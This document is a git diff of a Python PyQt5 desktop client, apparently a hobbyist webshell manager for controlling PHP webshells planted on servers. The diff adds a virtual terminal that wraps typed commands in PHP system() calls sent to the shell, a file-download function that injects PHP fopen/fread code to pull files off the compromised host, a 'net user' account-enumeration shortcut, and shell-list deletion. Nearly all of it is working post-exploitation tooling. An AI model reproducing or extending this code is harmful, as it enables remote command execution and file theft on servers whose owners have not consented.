@@ -14,7 +14,7 @@ from PyQt5.uic.properties import QtWidgets
 
 from PyQt5.uic import loadUi  # 需要导入的模块
 
-from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QWidget, QMenu
+from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QDialog, QWidget, QMenu, QFileDialog
 from PyQt5 import QtWidgets, QtCore, QtGui
 
 import sys
@@ -32,30 +32,40 @@ class php7(QMainWindow):
 
         self.wen_jian_guan_li_widget.hide() #隐藏所有内嵌窗口
         self.listWidget.hide()
-        self.bei_jing_label.hide()
+        #self.bei_jing_label.hide()
+        self.cmd_widget.hide()
+        #self.cmd_textEdit.hide()
+        #self.cmd_lineEdit.hide()
 
         self.wen_jian_guan_li_action.triggered.connect(self.show_wen_jian_guan_li)
         self.shell_guan_li_action.triggered.connect(self.show_shell_guan_li)
+        self.cmd_action.triggered.connect(self.show_cmd)
+        self.cha_xun_users_action.triggered.connect(self.User)
 
         self.listWidget.installEventFilter(self)  # 初始化QListView控件焦点事件
         self.treeWidget_2.installEventFilter(self)  # 初始化treeWidget_2控件焦点事件
 
         self.treeWidget.doubleClicked.connect(self.displayfile)  # teeweight双击
 
+        #虚拟终端部分
+        self.Virtualshell()
+        self.zhi_xing_pushButton.clicked.connect(self.shellcommand)
+        self.clear_pushButton.clicked.connect(self.clearVirtual)
+
         self.gif = QtGui.QMovie('3.gif')
         self.bei_jing_label.setMovie(self.gif)
         self.gif.start()
 
-        #self.setIcon()  #调用背景图和图标添加格式
+        self.setIcon()  #调用图标设置函数
 
         #self.eventFilter(GetForegroundWindow())
 
         #self.pushButton.clicked.connect(self.GetLine)   #调用UI文件中的控件
         #self.pushButton.clicked.connect(self.Connect_shell)
 
-    '''背景图添加函数'''
+    '''背景图和logo添加函数'''
     def setIcon(self):
-        palette1 = QtGui.QPalette()
+        '''palette1 = QtGui.QPalette()
         pix = QtGui.QPixmap("./3.gif")
 
         pix = pix.scaled(self.width(),self.height())
@@ -65,7 +75,7 @@ class php7(QMainWindow):
         self.setPalette(palette1)
         # self.setAutoFillBackground(True) # 不设置也可以
 
-        # self.setGeometry(300, 300, 250, 150)
+        # self.setGeometry(300, 300, 250, 150)'''
         self.setWindowIcon(QtGui.QIcon('logo.png'))
 
 
@@ -86,6 +96,10 @@ class php7(QMainWindow):
 
     def show_shell_guan_li(self):#点击shell管理后展示shell管理内嵌窗口
         self.wen_jian_guan_li_widget.hide()
+        self.cmd_widget.hide()
+        self.bei_jing_label.hide()
+        # self.cmd_textEdit.hide()
+        # self.cmd_lineEdit.hide()
         self.listWidget.show()
 
     def createContextMenu(self):
@@ -108,7 +122,7 @@ class php7(QMainWindow):
         self.connect_shell_button.triggered.connect(self.Connect_shell)
         self.add_shell_button.triggered.connect(self.Add_shell_show)
         #self.modify_shell_button.triggered.connect(self.Modify_shell)
-        #self.delete_shell_button.triggered.connect(self.Delete_shell)
+        self.delete_shell_button.triggered.connect(self.Delete_shell)
         #self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
 
     def showContextMenu(self, pos):  # 右键点击时调用的函数
@@ -176,10 +190,27 @@ class php7(QMainWindow):
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "连接失败！")
             print("连接失败")
+    '''删除shell'''
+    def Delete_shell(self):
+        button = QMessageBox.question(self, "警告！",
+                                      self.tr("你确定要删除选中的项吗？"),
+                                      QMessageBox.Ok | QMessageBox.Cancel,
+                                      QMessageBox.Ok)
+        if button == QMessageBox.Ok:
+            shell = self.listWidget.currentRow()  # 获取选择项的行号
+            # shell = self.Ui.listWidget.currentItem().text()  # 返回选择行的数据
+            #shell2 = self.listWidget.currentItem().text()
+            self.listWidget.takeItem(shell)  # 删除listwidget中的数据
+        else:
+            return
 
     '''文件管理部分'''
     def show_wen_jian_guan_li(self):#点击文件管理后展示文件管理内嵌窗口
         self.listWidget.hide()
+        self.cmd_widget.hide()
+        self.bei_jing_label.hide()
+        #self.cmd_textEdit.hide()
+        #self.cmd_lineEdit.hide()
         self.wen_jian_guan_li_widget.show()
 
     def fileContextMenu(self):
@@ -204,7 +235,7 @@ class php7(QMainWindow):
         # 当然也可以将他们分别与不同函数关联，实现不同的功能
         self.file_update.triggered.connect(self.File_update)
         #self.file_upload.triggered.connect(self.File_upload)
-        #self.file_download.triggered.connect(self.File_download)
+        self.file_download.triggered.connect(self.File_download)
         #self.file_delete.triggered.connect(self.File_delete)
         #self.file_rename.triggered.connect(self.renameshow)
 
@@ -231,7 +262,7 @@ class php7(QMainWindow):
         # data = (response.read()).deco de('utf-8')
         return response.read()
 
-
+    '''更新'''
     def File_update(self):
         shell = self.shelllabel.text()
         #shell = "http://127.0.0.1/word/hello.php  1"
@@ -376,7 +407,7 @@ class php7(QMainWindow):
     # sendcode函数是用来给发送的数据base64加密的函数
     def sendcode(self, phpcode):
         shell = self.shelllabel.text()  # 获取shell
-        shell = "http://127.0.0.1/word/hello.php  1"
+        #shell = "http://127.0.0.1/word/hello.php  1"
         if shell != "":
             shell = shell.split("  ")
 
@@ -387,14 +418,68 @@ class php7(QMainWindow):
 
             return self.filedir(shell, data)
         else:
-            # box = QtWidgets.QMessageBox()
-            # box.information(self, "提示", "请先连接shell！")
-            print("请先连接shell!")
+            box = QtWidgets.QMessageBox()
+            box.information(self, "提示", "请先连接shell！")
+            #print("请先连接shell!")
+
+    '''文件下载'''
+    def File_download(self):
+        shell = self.shelllabel.text()  # 获取shell
+        if shell != "":  # 判断是否连接shell
+            try:
+                path = self.showfilepath()  # 获取文件的路径
+                filepath = self.treeWidget_2.currentItem().text(0)  # 获取文件名
+                compath = path + "\\\\" + filepath  # 组合路径
+                phpcode = '$F = "' + compath + '";$fp=@fopen($F,"rb") or die("Unable to open file!") ;echo @fread($fp,filesize($F));@fclose($fp);die();'
+                # print(filepath)
+                # print(compath)
+                # print(phpcode)
+                returndata = self.sendcode(phpcode)  # 尝试下载文件
+                # print(returndata)
+                # 写入文件
+                #print(returndata)
+                if returndata != "" and returndata != "Unable to open file!":
+
+                    savefilepath = self.filesave(filepath)
+
+                    #print(filepath)
+                    #print(savefilepath)
+                    f = open(savefilepath, "wb")  # 打开文件
+                    f.write(returndata)  # 写入文件
+                    f.close()  # 关闭文件
+                    box = QtWidgets.QMessageBox()
+                    box.information(self, "提示", "下载成功！")
+                else:
+                    box = QtWidgets.QMessageBox()
+                    box.information(self, "提示", "下载失败！")
+            except:
+                box = QtWidgets.QMessageBox()
+                box.information(self, "提示", "下载失败！")
+        else:
+            box = QtWidgets.QMessageBox()
+            box.information(self, "提示", "请先连接shell！")
+
+    '''文件保存对话框'''
+
+    def filesave(self, filename):
+        #print(filename)
+        fileName, filetype = QFileDialog.getSaveFileName(self, (r"保存文件"), (r'G:\\' + filename), r"All files(*.*)")
+        #print(1)
+        # print(fileName)
+        return fileName
 
     '''虚拟终端'''
 
+    def show_cmd(self):#点击虚拟终端后展示虚拟终端内嵌窗口
+        self.wen_jian_guan_li_widget.hide()
+        self.listWidget.hide()
+        self.bei_jing_label.hide()
+        self.cmd_widget.show()
+        #self.cmd_textEdit.show()
+        #self.cmd_lineEdit.show()
+
     def Virtualshell(self):
-        self.cmd_textEdit.setReadOnly(True)  # 设置textRdit不可编辑
+        self.cmd_textEdit.setReadOnly(True)  # 设置textEdit不可编辑
         self.cmd_textEdit.setText(r"C:\Users\admin> ")
     #虚拟终端执行按钮
     def shellcommand(self):
@@ -404,16 +489,37 @@ class php7(QMainWindow):
         #print(shellcommand)
         #print(shell)
         phpcode ="system('" + shellcommand + "');"
-        print(phpcode)
+        #print(phpcode)
         returncommand = self.sendcode(phpcode)
         #print(type(returncommand))
         #print(returncommand)
-        print(str(returncommand, 'GB2312'))
-        self.cmd_textEdit.setText(returncommand)
+        #print(str(returncommand, 'GB2312'))
+        self.cmd_textEdit.setText(str(returncommand, 'GB2312'))
     #清空按钮
     def clearVirtual(self):
         self.cmd_lineEdit.clear()
         self.cmd_textEdit.clear()
+
+    '''快捷功能部分'''
+
+    def User(self):
+        user = ""
+        phpcode = 'system("net user");'
+        print(phpcode)
+        data = self.sendcode(phpcode)
+        print(data)
+        # print(data[113:-20])
+        if data != None:
+            data = data[113:-20].replace('\r\n', '').split(" ")
+            print(data)
+            for i in data:
+                if i != "":
+                    user += "用户：" + i + "\n"
+            # print(user)
+            box = QtWidgets.QMessageBox()
+            box.about(self, "查询用户", user[:-1])
+        else:
+            pass
 
 if __name__ == '__main__':
     print("hello")
